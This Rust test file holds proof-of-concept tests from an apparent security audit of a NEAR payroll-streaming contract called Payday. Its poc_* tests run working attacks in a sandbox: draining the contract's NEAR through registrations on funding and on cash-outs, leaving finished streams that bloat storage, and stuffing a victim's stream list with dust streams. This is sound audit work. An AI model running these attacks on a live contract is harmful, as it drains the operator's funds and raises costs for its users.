//! Proof-of-concept tests for the November 2026 security review (see AUDIT.md).
//!
//! Each `poc_*` test PASSES while the issue it describes exists and prints the numbers
//! quoted in the report. Each `check_*` test confirms something the review relied on.
//! Run with: cargo test --test audit_poc -- --nocapture --test-threads=1

use near_workspaces::network::Sandbox;
use near_workspaces::types::{Gas, NearToken};
use near_workspaces::{Account, AccountId, Contract, Worker};
use serde_json::{json, Value};

const USDC: u128 = 1_000_000;
const STORAGE: NearToken = NearToken::from_yoctonear(1_250_000_000_000_000_000_000);
const REGISTRATION_YOCTO: u128 = 1_250_000_000_000_000_000_000;
const YOCTO_PER_NEAR: f64 = 1e24;

struct Env {
    sandbox: Worker<Sandbox>,
    usdc: Contract,
    payday: Contract,
}

async fn setup() -> anyhow::Result<Env> {
    let sandbox = near_workspaces::sandbox().await?;
    let usdc = sandbox
        .dev_deploy(&std::fs::read("../mock-usdc/target/near/mock_usdc.wasm")?)
        .await?;
    usdc.call("new").transact().await?.into_result()?;
    let payday = sandbox
        .dev_deploy(&std::fs::read("target/near/payday.wasm")?)
        .await?;
    payday
        .call("new")
        .args_json(json!({ "token": usdc.id() }))
        .transact()
        .await?
        .into_result()?;
    usdc.call("storage_deposit")
        .args_json(json!({ "account_id": payday.id(), "registration_only": true }))
        .deposit(STORAGE)
        .transact()
        .await?
        .into_result()?;
    Ok(Env { sandbox, usdc, payday })
}

impl Env {
    /// A funded account holding `usdc` test USDC.
    async fn account_with(&self, usdc: u128) -> anyhow::Result<Account> {
        let account = self.sandbox.dev_create_account().await?;
        for chunk in std::iter::repeat_n(10_000 * USDC, (usdc / (10_000 * USDC)) as usize)
            .chain(std::iter::once(usdc % (10_000 * USDC)))
            .filter(|c| *c > 0)
        {
            account
                .call(self.usdc.id(), "mint")
                .args_json(json!({ "account_id": account.id(), "amount": chunk.to_string() }))
                .transact()
                .await?
                .into_result()?;
        }
        Ok(account)
    }

    async fn now(&self) -> anyhow::Result<u64> {
        Ok(self.sandbox.view_block().await?.timestamp() / 1_000_000_000)
    }

    async fn usdc_of(&self, id: &AccountId) -> anyhow::Result<u128> {
        let v: String = self
            .usdc
            .view("ft_balance_of")
            .args_json(json!({ "account_id": id }))
            .await?
            .json()?;
        Ok(v.parse()?)
    }

    async fn near_of_payday(&self) -> anyhow::Result<u128> {
        Ok(self.payday.view_account().await?.balance.as_yoctonear())
    }

    async fn storage_of_payday(&self) -> anyhow::Result<u64> {
        Ok(self.payday.view_account().await?.storage_usage)
    }

    async fn stream(&self, id: u64) -> anyhow::Result<Value> {
        Ok(self
            .payday
            .view("get_stream")
            .args_json(json!({ "stream_id": id }))
            .await?
            .json()?)
    }

    /// Funds one stream per (worker, amount, start, stop). Returns total gas burnt.
    async fn fund(
        &self,
        employer: &Account,
        streams: &[(AccountId, u128, u64, u64)],
        gas: Gas,
    ) -> anyhow::Result<u64> {
        let total: u128 = streams.iter().map(|s| s.1).sum();
        let list: Vec<Value> = streams
            .iter()
            .map(|(w, a, s, e)| json!({ "worker": w, "amount": a.to_string(), "start": s, "stop": e }))
            .collect();
        let outcome = employer
            .call(self.usdc.id(), "ft_transfer_call")
            .args_json(json!({
                "receiver_id": self.payday.id(),
                "amount": total.to_string(),
                "msg": json!({ "streams": list }).to_string(),
            }))
            .deposit(NearToken::from_yoctonear(1))
            .gas(gas)
            .transact()
            .await?;
        let burnt = outcome.total_gas_burnt.as_gas();
        outcome.into_result()?;
        Ok(burnt)
    }
}

fn ghost(prefix: &str, i: usize) -> AccountId {
    format!("{prefix}-{i}.near").parse().unwrap()
}

fn near(yocto: u128) -> f64 {
    yocto as f64 / YOCTO_PER_NEAR
}

const MAX_GAS: Gas = Gas::from_tgas(300);

/// F-01: funding registers every new worker with the token using Payday's own NEAR.
/// An attacker funds 25 streams that have not started, cancels them all, and gets every
/// unit of USDC back, while Payday has paid 25 registrations.
#[tokio::test]
async fn poc_fund_then_cancel_spends_contract_near() -> anyhow::Result<()> {
    let env = setup().await?;
    let attacker = env.account_with(25 * USDC).await?;
    let now = env.now().await?;
    let streams: Vec<_> = (0..25)
        .map(|i| (ghost("f01", i), USDC, now + 10_000, now + 20_000))
        .collect();

    let near_before = env.near_of_payday().await?;
    env.fund(&attacker, &streams, MAX_GAS).await?;
    for id in 1..=25u64 {
        attacker
            .call(env.payday.id(), "cancel")
            .args_json(json!({ "stream_id": id }))
            .gas(Gas::from_tgas(40))
            .transact()
            .await?
            .into_result()?;
    }
    let spent = near_before.saturating_sub(env.near_of_payday().await?);

    assert_eq!(env.usdc_of(attacker.id()).await?, 25 * USDC, "attacker lost no USDC");
    assert!(env.stream(1).await?.is_null(), "streams are gone");
    assert!(
        spent > 20 * REGISTRATION_YOCTO,
        "contract should have paid for ~25 registrations, paid {} NEAR",
        near(spent)
    );
    println!(
        "F-01  contract NEAR spent: {:.5} for 25 streams ({:.5} each); attacker USDC lost: 0",
        near(spent),
        near(spent) / 25.0
    );
    Ok(())
}

/// F-02: a stream that has finished and been fully withdrawn is never removed. The
/// attacker pays themselves 25 one-USDC salaries, recovers all of it, and leaves 25
/// records that Payday pays storage for, forever.
#[tokio::test]
async fn poc_finished_streams_are_never_removed() -> anyhow::Result<()> {
    let env = setup().await?;
    let attacker = env.account_with(25 * USDC).await?;
    let sink = env.sandbox.dev_create_account().await?;
    let now = env.now().await?;
    let streams: Vec<_> = (0..25)
        .map(|_| (sink.id().clone(), USDC, now - 100, now + 3))
        .collect();

    let storage_before = env.storage_of_payday().await?;
    env.fund(&attacker, &streams, MAX_GAS).await?;
    while env.now().await? <= now + 3 {
        env.sandbox.fast_forward(5).await?;
    }
    for id in 1..=25u64 {
        sink.call(env.payday.id(), "withdraw")
            .args_json(json!({ "stream_id": id }))
            .gas(Gas::from_tgas(40))
            .transact()
            .await?
            .into_result()?;
    }
    let grown = env.storage_of_payday().await? - storage_before;

    assert_eq!(env.usdc_of(sink.id()).await?, 25 * USDC, "all USDC came back");
    assert_eq!(env.usdc_of(env.payday.id()).await?, 0, "contract holds nothing for them");
    assert!(!env.stream(1).await?.is_null() && !env.stream(25).await?.is_null());
    assert!(grown > 25 * 100, "storage should have grown, grew {grown} bytes");
    println!(
        "F-02  storage kept after 25 finished, fully paid streams: {grown} bytes ({} per stream, {:.5} NEAR locked each)",
        grown / 25,
        (grown / 25) as f64 * 1e-5
    );
    Ok(())
}

/// F-03: anyone can add entries to a victim's stream list. Cancelling a stream a moment
/// after it starts refunds the attacker everything except dust, and the dust stream stays
/// in the victim's list until the victim withdraws it. `streams_of` returns the whole
/// list in one call, and funding the victim rewrites the whole list.
#[tokio::test]
async fn poc_dust_streams_fill_a_victims_list() -> anyhow::Result<()> {
    let env = setup().await?;
    let attacker = env.account_with(600 * USDC).await?;
    let employer = env.account_with(10 * USDC).await?;
    let victim: AccountId = "victim.near".parse()?;
    let now = env.now().await?;

    // One dust stream: about a millionth of the 1 USDC has vested when it is cancelled.
    env.fund(&attacker, &[(victim.clone(), USDC, now - 2_000, now + 1_000_000_000)], MAX_GAS)
        .await?;
    attacker
        .call(env.payday.id(), "cancel")
        .args_json(json!({ "stream_id": 1 }))
        .gas(Gas::from_tgas(40))
        .transact()
        .await?
        .into_result()?;
    let dust_cost = 600 * USDC - env.usdc_of(attacker.id()).await?;
    let dust = env.stream(1).await?;
    assert!(!dust.is_null(), "the dust stream survives the cancel");
    assert!(dust_cost < 10, "attacker paid {dust_cost} base units");

    let honest_before = env
        .fund(&employer, &[(victim.clone(), USDC, now, now + 1_000_000)], MAX_GAS)
        .await?;

    // Grow the list. Finished streams stay too (F-02), which is a quick way to add 500.
    for _ in 0..20 {
        let batch: Vec<_> = (0..25)
            .map(|_| (victim.clone(), USDC, now - 100, now + 1_000_000))
            .collect();
        env.fund(&attacker, &batch, MAX_GAS).await?;
    }
    let honest_after = env
        .fund(&employer, &[(victim.clone(), USDC, now, now + 1_000_000)], MAX_GAS)
        .await?;

    let listed: Vec<Value> = env
        .payday
        .view("streams_of")
        .args_json(json!({ "account_id": victim }))
        .await?
        .json()?;
    assert_eq!(listed.len(), 503);
    assert!(honest_after > honest_before, "funding the victim costs more as the list grows");
    let per_entry = (honest_after - honest_before) as f64 / 501.0;
    println!(
        "F-03  dust stream cost the attacker {dust_cost} base units of USDC and stays listed.\n      \
         funding the victim: {:.3} Tgas with 2 entries, {:.3} Tgas with 503 ({:.5} Tgas per entry);\n      \
         streams_of returned {} entries in one view call ({} bytes of JSON)",
        honest_before as f64 / 1e12,
        honest_after as f64 / 1e12,
        per_entry / 1e12,
        listed.len(),
        serde_json::to_string(&listed)?.len()
    );
    Ok(())
}

/// F-04: withdrawing to another account registers that account with Payday's NEAR. A
/// worker who splits a salary into 1 USDC cash-outs to fresh accounts keeps all the USDC
/// and makes Payday pay a registration each time.
#[tokio::test]
async fn poc_cash_outs_to_fresh_accounts_spend_contract_near() -> anyhow::Result<()> {
    let env = setup().await?;
    let employer = env.account_with(20 * USDC).await?;
    let worker = env.sandbox.dev_create_account().await?;
    let now = env.now().await?;
    env.fund(&employer, &[(worker.id().clone(), 20 * USDC, now - 1_000, now + 1)], MAX_GAS)
        .await?;
    while env.now().await? <= now + 1 {
        env.sandbox.fast_forward(5).await?;
    }

    let near_before = env.near_of_payday().await?;
    for i in 0..10 {
        worker
            .call(env.payday.id(), "withdraw")
            .args_json(json!({ "stream_id": 1, "amount": USDC.to_string(), "receiver": ghost("f04", i) }))
            .gas(Gas::from_tgas(50))
            .transact()
            .await?
            .into_result()?;
    }
    let spent = near_before.saturating_sub(env.near_of_payday().await?);

    assert_eq!(env.usdc_of(&ghost("f04", 9)).await?, USDC);
    assert!(spent > 8 * REGISTRATION_YOCTO, "paid {} NEAR", near(spent));
    println!(
        "F-04  contract NEAR spent on 10 cash-outs of 1 USDC: {:.5} ({:.5} each)",
        near(spent),
        near(spent) / 10.0
    );
    Ok(())
}

/// The relayer caps funding at 250 Tgas. A full batch of 25 streams to 25 new workers
/// must fit, including the 25 registrations.
#[tokio::test]
async fn check_full_batch_fits_the_relayer_gas_cap() -> anyhow::Result<()> {
    let env = setup().await?;
    let employer = env.account_with(25 * USDC).await?;
    let now = env.now().await?;
    let streams: Vec<_> = (0..25)
        .map(|i| (ghost("batch", i), USDC, now, now + 1_000))
        .collect();

    let burnt = env.fund(&employer, &streams, Gas::from_tgas(250)).await?;

    assert!(!env.stream(25).await?.is_null());
    for i in [0, 24] {
        let registered: Option<Value> = env
            .usdc
            .view("storage_balance_of")
            .args_json(json!({ "account_id": ghost("batch", i) }))
            .await?
            .json()?;
        assert!(registered.is_some(), "worker {i} should be registered");
    }
    println!(
        "CHECK full batch of 25 with 250 Tgas attached: ok, {:.1} Tgas burnt",
        burnt as f64 / 1e12
    );
    Ok(())
}

/// A withdrawal with too little gas for its transfer and callback must fail as a whole:
/// the books may not move unless the callback is guaranteed to run.
#[tokio::test]
async fn check_underfunded_withdraw_changes_nothing() -> anyhow::Result<()> {
    let env = setup().await?;
    let employer = env.account_with(10 * USDC).await?;
    let worker = env.sandbox.dev_create_account().await?;
    let now = env.now().await?;
    env.fund(&employer, &[(worker.id().clone(), 10 * USDC, now - 500, now + 500)], MAX_GAS)
        .await?;

    for tgas in [5u64, 12, 18, 21] {
        let outcome = worker
            .call(env.payday.id(), "withdraw")
            .args_json(json!({ "stream_id": 1 }))
            .gas(Gas::from_tgas(tgas))
            .transact()
            .await?;
        let withdrawn = env.stream(1).await?["withdrawn"].as_str().unwrap().to_string();
        let paid = env.usdc_of(worker.id()).await?;
        println!(
            "CHECK withdraw with {tgas} Tgas: success={}, recorded withdrawn={withdrawn}, worker holds {paid}",
            outcome.is_success()
        );
        assert_eq!(
            withdrawn.parse::<u128>()?,
            paid,
            "books and tokens must agree after a {tgas} Tgas withdraw"
        );
    }
    Ok(())
}
